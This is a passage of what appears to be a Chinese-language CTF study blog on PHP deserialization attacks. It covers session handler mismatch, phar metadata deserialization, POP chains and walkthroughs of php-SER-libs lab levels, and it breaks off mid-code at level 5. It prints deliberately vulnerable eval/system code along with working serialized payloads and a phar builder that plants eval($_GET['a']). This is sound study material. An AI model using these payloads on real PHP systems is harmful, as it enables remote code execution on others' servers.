= <span class="variable">$_GET</span>[<span class="string">&#x27;ben&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240423132729023.png" alt="image-20240423132729023"></p><p><img src="/../image/image-20240423133002797.png" alt="image-20240423133002797"></p><p><img src="/../image/image-20240423153656983.png" alt="image-20240423153656983"></p><p><img src="/../image/image-20240423153729988.png" alt="image-20240423153729988"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;ben&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240423155140220.png" alt="image-20240423155140220"></p><p><strong>构造</strong>,关键是一个页面写入，另一个页面会读取</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span> = <span class="string">&#x27;system(&quot;dir&quot;)&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">D</span>());</span><br><span class="line"><span class="comment">#O:1:&quot;D&quot;:1:&#123;s:1:&quot;a&quot;;s:13:&quot;system(&quot;dir&quot;)&quot;;&#125;记得+上|</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240423155441641.png" alt="image-20240423155441641"></p><p>例题</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*hint.php*/</span><span class="comment">#线索</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;her=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name===<span class="variable language_">$this</span>-&gt;her)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*hint.php*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要用到引用的知识</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name =&amp; <span class="variable">$a</span>-&gt;her;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240423160332991.png" alt="image-20240423160332991"></p><h2 id="phpar"><a href="#phpar" class="headerlink" title="phpar"></a>phpar</h2><p><img src="/../image/image-20240423160538802.png" alt="image-20240423160538802"></p><p><img src="/../image/image-20240423160548405.png" alt="image-20240423160548405"></p><p><img src="/../image/image-20240423160756154.png" alt="image-20240423160756154"></p><p><img src="/../image/image-20240423160805460.png" alt="image-20240423160805460"></p><p><img src="/../image/image-20240423160937600.png" alt="image-20240423160937600"></p><p><img src="/../image/image-20240423160957547.png" alt="image-20240423160957547"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//漏洞页面</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Testobj</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&quot;echo &#x27;ok&#x27;;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Testobj</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);   <span class="comment">//删除之前的test.par文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);  <span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="comment">//写入stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">Testobj</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;output=<span class="string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240423161535651.png" alt="image-20240423161535651"></p><p>例题</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//upload.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240423162054135.png" alt="image-20240423162054135"></p><p><img src="/../image/image-20240423162144291.png" alt="image-20240423162144291"></p><p><img src="/../image/image-20240423162203703.png" alt="image-20240423162203703"></p><p><img src="/../image/image-20240423162215775.png" alt="image-20240423162215775"></p><p>记得把php,ini里的phar_readonly关了</p><p><img src="/../image/image-20240423162652131.png" alt="image-20240423162652131"><img src="/../image/image-20240423162829554.png" alt="image-20240423162829554"></p><p><img src="/../image/image-20240423163005142.png" alt="image-20240423163005142"></p><p><img src="/../image/image-20240423163017481.png" alt="image-20240423163017481"></p><h3 id="mylove"><a href="#mylove" class="headerlink" title="mylove"></a>mylove</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="comment">//当访问 a 对象中不存在的属性时，该方法会调用 b 对象的 love 方法。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="comment">//__destruct 方法在对象销毁时自动调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//__wakeup 方法在对象被反序列化后自动调用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;mylove;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.|\.php/&quot;</span>,<span class="variable">$this</span>-&gt;man))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;文件名不能有.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将解码后的 $woman 内容写入文件，文件名由 $man 决定。</span></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;man,<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;woman));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">end</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/N$/&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$$tmp</span>[<span class="string">&#x27;name&#x27;</span>]==<span class="string">&#x27;your are good!&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ok!&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="php-SER-libs"><a href="#php-SER-libs" class="headerlink" title="php-SER-libs"></a><strong><a href="https://github.com/fine-1/php-SER-libs">php-SER-libs</a></strong></h1><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><table><thead><tr><th>关卡</th><th>不适用其他版本的原因以及相关设置</th></tr></thead><tbody><tr><td>level4 create_fucntion与可变函数调用</td><td>5.6不支持可变函数，7.2已废除create_function</td></tr><tr><td>level5 序列化格式过滤与CVE-2016-7124</td><td>CVE-2016-7124漏洞影响版本：PHP5 &lt; 5.6.25，PHP7 &lt; 7.0.10</td></tr><tr><td>level6 私有属性反序列化</td><td>escaped binary string(仅从php6开始支持)</td></tr><tr><td>level7 __call与属性的初始值</td><td>同上</td></tr><tr><td>level10 just_one_soap</td><td>需要开启soap扩展(php5.6：extension&#x3D;php_soap)</td></tr><tr><td>level11 a phar 和 level12 a phar trick</td><td>php.ini中phar.readonly&#x3D;Off（若有分号则去掉）</td></tr><tr><td>level13 引用和session</td><td>session.auto_start&#x3D;0; session.serialize_handler &#x3D; php;（level13均为默认设置）</td></tr><tr><td>leve14 session.upload_progress</td><td>session.auto_start&#x3D;0; session.serialize_handler &#x3D; php_serialize; session.upload_progress.enabled &#x3D; On; session.upload_progress.cleanup &#x3D; Off; session.upload_progress.prefix &#x3D; “upload_progress_”; session.upload_progress.name &#x3D; “PHP_SESSION_UPLOAD_PROGRESS”; session.upload_progress.freq &#x3D; “1%”; session.upload_progress.min_freq &#x3D; “1”;</td></tr></tbody></table><h2 id="level1-类的实例化"><a href="#level1-类的实例化" class="headerlink" title="level1 类的实例化"></a>level1 <strong>类的实例化</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$act</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#O:1:&quot;a&quot;:1:&#123;s:3:&quot;var&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p>直接构造就行</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mylogin</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>,<span class="variable">$pass</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass=<span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;user==<span class="string">&quot;daydream&quot;</span> <span class="keyword">and</span> <span class="variable language_">$this</span>-&gt;pass==<span class="string">&quot;ok&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">login</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;br&gt;&lt;a href=<span class="string">&quot;../level3&quot;</span>&gt;点击进入第三关&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>关键是要两个成员的值和判断条件一致,而调用construct方法，则需要序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mylogin</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>=<span class="string">&quot;daydream&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>=<span class="string">&quot;ok&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">mylogin</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#O:7:&quot;mylogin&quot;:2:&#123;s:4:&quot;user&quot;;s:8:&quot;daydream&quot;;s:4:&quot;pass&quot;;s:2:&quot;ok&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240423163756568.png" alt="image-20240423163756568"></p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a><strong>level3</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mylogin</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>,<span class="variable">$pass</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass=<span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;user==<span class="string">&quot;daydream&quot;</span> <span class="keyword">and</span> <span class="variable language_">$this</span>-&gt;pass==<span class="string">&quot;ok&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;param&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">login</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;br&gt;&lt;a href=<span class="string">&quot;../level4&quot;</span>&gt;点击进入第四关&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>分析:这里和上一题差不多，就是要从cookie中读取反序列化的值，搜了下，加上url编码即可，但好像只能本地用，</p><p><img src="/../image/image-20240423171111860.png" alt="image-20240423171111860"></p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>本关涉及到create_fucntion方法要变换php版本，可以使用–php 7. 0.9</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;        </span><br><span class="line">                <span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;key);</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;       <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$action</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="variable language_">$this</span>-&gt;action;</span><br><span class="line">            <span class="variable">$a</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;br&gt;&lt;a href=<span class="string">&quot;../level5&quot;</span>&gt;点击进入第五关&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>这里还用到一个php特性——Array</p><p>当array内包裹的第一个值是对象，第二个是对象内的方法时</p><p>在反序列化后会调用该对象的方法</p><p><img src="/../image/image-20240423182048184.png" alt="image-20240423182048184"></p><p>所以就可以利用这个特性调用到getflag这个方法，至于如何读取到flag就要用到前面说的create_fucntion,但不懂为什么不会弹回flag，应该是版本问题</p><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a><strong>level5</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">include_once</span>(<span class="variable language_">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;index.php&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">    